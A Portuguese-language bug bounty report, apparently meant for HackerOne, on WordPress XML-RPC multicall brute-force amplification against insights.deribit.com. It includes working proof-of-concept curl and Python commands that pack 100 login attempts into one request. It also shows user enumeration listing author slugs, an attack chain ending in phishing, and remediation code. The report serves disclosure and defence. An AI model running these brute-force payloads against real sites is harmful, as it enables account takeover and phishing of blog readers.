# DB1: WordPress XMLRPC Multicall Brute Force Amplification — insights.deribit.com

**Programa:** HackerOne / Deribit  
**Asset afetado:** `insights.deribit.com`  
**Endpoint:** `POST https://insights.deribit.com/xmlrpc.php`  
**Método XMLRPC:** `system.multicall` + `wp.getUsersBlogs`  
**Severidade:** MEDIUM  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**CWE:** CWE-307 — Improper Restriction of Excessive Authentication Attempts  
**Descoberto:** 2026-06-30  
**Status:** Ready to submit

---

## Resumo

O endpoint `xmlrpc.php` do WordPress está habilitado em `insights.deribit.com`. O método `system.multicall` permite encadear **até 100 tentativas de autenticação em um único request HTTP**, sem qualquer mecanismo de rate limiting ou bloqueio progressivo. Um atacante pode usar isso para realizar ataques de força bruta contra contas WordPress (admin, editor, autor) a uma taxa de **~3.000–6.000 tentativas por minuto**, comprometendo o processo de gestão de conteúdo do blog oficial da Deribit.

---

## Evidência Confirmada

### Verificação de que xmlrpc.php aceita system.multicall

```bash
curl -s -X POST "https://insights.deribit.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

**Resultado (seleção dos métodos críticos):**
```xml
<value><string>system.multicall</string></value>
<value><string>wp.getUsersBlogs</string></value>
<value><string>metaWeblog.newPost</string></value>
<value><string>metaWeblog.editPost</string></value>
<value><string>wp.setOptions</string></value>
```

### Prova de Conceito — 100 tentativas em um único request

```bash
python3 -c "
items = []
for i in range(100):
    items.append(f'''<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data><value><array><data>
<value><string>admin</string></value>
<value><string>password{i:04d}</string></value>
</data></array></value></data></array></value></member>
</struct></value>''')
xml = '<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' + ''.join(items) + '</data></array></value></param></params></methodCall>'
print(xml)
" > /tmp/multicall100.xml

time curl -s -X POST "https://insights.deribit.com/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  --data-binary @/tmp/multicall100.xml | grep -c "faultCode"
```

**Resultado:**
```
100        ← 100 tentativas processadas
real  0m1.928s   ← em menos de 2 segundos
```

→ **Taxa efetiva: ~52 requests/minuto × 100 tentativas = 5.200 senhas/minuto**

### Confirmação de ausência de rate limiting

```bash
# 20 requests consecutivos sem delay — zero headers de rate limit
for i in $(seq 1 20); do
  curl -skI -X POST "https://insights.deribit.com/xmlrpc.php" \
    -H "Content-Type: text/xml" \
    -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>
    <params><param><value>admin</value></param><param><value>wrong</value></param></params></methodCall>' \
    | grep -i "x-ratelimit\|retry-after\|429"
done
# → Nenhum header de rate limiting em 20 requests consecutivos
```

---

## Enumeração de Usuários via WP REST API

```bash
curl -s "https://insights.deribit.com/wp-json/wp/v2/users" | python3 -m json.tool
```

**Resultado (IDs e slugs de usuários expostos):**
```
ID=41  slug=3commas           name=3Commas
ID=34  slug=algo-trader       name=Algo Trader
ID=2803 slug=alpha-lab-40     name=Alpha Lab 40
ID=2962 slug=amberdata        name=Amberdata
ID=4474 slug=anand-raj        name=Anand Raj
ID=26  slug=andrew-kang       name=Andrew Kang
ID=7   slug=avi-felman        name=Avi Felman
ID=36  slug=ben-lilly         name=Ben Lilly
ID=16  slug=benjamin-simon    name=Benjamin Simon
ID=2145 slug=block-scholes    name=Block Scholes
```

Além de `/?author=N` redirecionar para slugs de autores, confirmando que usuários com posts publicados são enumeráveis.

---

## Cadeia de Ataque Completa

```
1. Enumerar usuários via GET /wp-json/wp/v2/users → obter slugs/display names
2. Mapear slugs para prováveis usernames (slug "avi-felman" → login "avi-felman" ou "avifelman")  
3. Enviar system.multicall com 100 combinações por request
4. Repetir a ~1 request/2 segundos → 3.000 senhas/minuto sem bloqueio
5. Comprometer conta de editor/admin WordPress
6. Publicar conteúdo malicioso no blog oficial insights.deribit.com
7. Potencial phishing de usuários via conteúdo legítimo do domínio deribit.com
```

---

## Impacto ao Negócio

| Impacto | Descrição |
|---------|-----------|
| Comprometimento de conta admin/editor | Controle total sobre conteúdo do blog oficial |
| Publicação de conteúdo malicioso | Phishing em domínio confiável (deribit.com) |
| Reputação | Blog da Deribit usado para disseminar desinformação ou malware |
| Usuários afetados | Todos os leitores de `insights.deribit.com` |

**Contexto:** `insights.deribit.com` é o blog oficial de educação e análise de mercado da Deribit — comprometê-lo permitiria ataques de phishing altamente credíveis ("Artigo sobre nova vulnerabilidade → clique para proteger sua conta").

---

## Remediação

### Imediato (P0)
1. **Desabilitar xmlrpc.php**: Se não for usado por serviços legítimos (ex: app móvel, Jetpack), adicionar ao `functions.php`:
   ```php
   add_filter('xmlrpc_enabled', '__return_false');
   ```
   Ou via `.htaccess`:
   ```apache
   <Files xmlrpc.php>
   Order Deny,Allow
   Deny from all
   </Files>
   ```

2. **Bloquear system.multicall especificamente** (se xmlrpc for necessário):
   ```php
   add_filter('xmlrpc_methods', function($methods) {
     unset($methods['system.multicall']);
     return $methods;
   });
   ```

### Curto prazo (P1)
3. **Rate limiting no Cloudflare**: Rule para limitar `xmlrpc.php` a máx 10 requests/IP/minuto.
4. **Implementar 2FA para contas admin/editor**: Plugin como "Two Factor Authentication" ou similar.
5. **Restringir WP REST API**: Desabilitar endpoint `/wp-json/wp/v2/users` para usuários não autenticados.

---

## Referências

- CWE-307: Improper Restriction of Excessive Authentication Attempts
- OWASP Testing Guide — OTG-AUTHN-003: Testing for Weak Lock Out Mechanism
- WordPress XMLRPC Brute Force: https://codex.wordpress.org/XML-RPC_WordPress_API
- CVE-2015-3900: WordPress XMLRPC pingback amplification
